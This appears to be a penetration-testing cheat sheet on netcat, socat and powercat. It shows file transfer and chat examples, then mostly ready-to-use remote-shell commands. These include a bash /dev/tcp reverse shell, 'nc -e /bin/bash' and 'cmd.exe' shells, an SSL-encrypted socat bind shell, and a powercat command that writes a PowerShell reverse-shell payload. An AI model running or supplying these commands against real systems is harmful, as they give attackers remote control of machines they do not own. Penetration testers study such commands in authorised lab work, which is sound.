# Netcat and Socat

## Objectives

We'll go over some examples on how to use and leverage ncat, socat, and powercat. [https://github.com/craSH/socat/](https://github.com/craSH/socat/) [https://nmap.org/ncat/guide/](https://nmap.org/ncat/guide/)

## Netcat Sending/Receiving

Receiving:

```text
nc -l 5555 > file_name
sudo socat TCP4-LISTEN:443,fork file:secret-pass.txt
```

Sending:

```text
nc 192.168.1.1 5555 < file_name
socat TCP4:192.168.1.4:443 file:receive_pass.txt,create
```

## Netcat Sending/Receiving Multiple Files

Receiving:

```text
nc -l 5555 | tar xzvf -
```

Sending:

```text
tar czvf - /path/to/dir | nc 192.168.1.1 5555
```

## Netcat Simple Chat Server \(add --ssl to make it encrypted\)

Receiving:

```text
nc -l 5555
sudo socat TCP4-LISTEN:443 STDOUT
```

Sending:

```text
nc 192.168.1.1 5555
socat - TCP4:192.168.1.4:443
```

## Netcat Reverse Shell and Others

Receiving:

```text
socat -d -d TCP4-LISTEN:443 STDOUT
nc -lvp 4444
bash -i >& /dev/tcp/192.168.100.113/4444 0>&1
```

Sending:

```text
socat TCP4:192.168.1.4:443 EXEC:/bin/bash
nc 192.168.1.4 4444 -e /bin/bash
nc.exe 192.168.100.113 4444 -e cmd.exe
```

## Netcat Bind Shell

Receiving:

```text
nc -lvp 4444 -e /bin/sh
```

Sending:

```text
nc 192.168.1.1 4444
```

## Encrypted Socat Bind Shell

Create SSL Cert:

```text
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
cat bind_shell.key bind_shell.crt >bind_shell.pem
```

**Create Socat Listener:**

```text
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

**Connect to Socat Listener:**

```text
socat - OPENSSL:192.168.1.4:443,verify=0
```

## Powercat

Powercat can be installed in Kali with apt install powercat, which will place the script in /usr/share/windows-resources/powercat. [https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat)

Powercat Reverse Shells:

```text
Receiver:
ncat -l -p 9000

Sender:
powercat -c 192.168.1.45 -p 9000 -e cmd.exe
```

Powercat Bind Shells:

```text
Receiver:
powercat -l -p 9000 -e cmd.exe

Sender:
ncat -nv 192.168.1.45 9000
```

Powershell Payload:

```text
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
./reverseshell.ps1
```

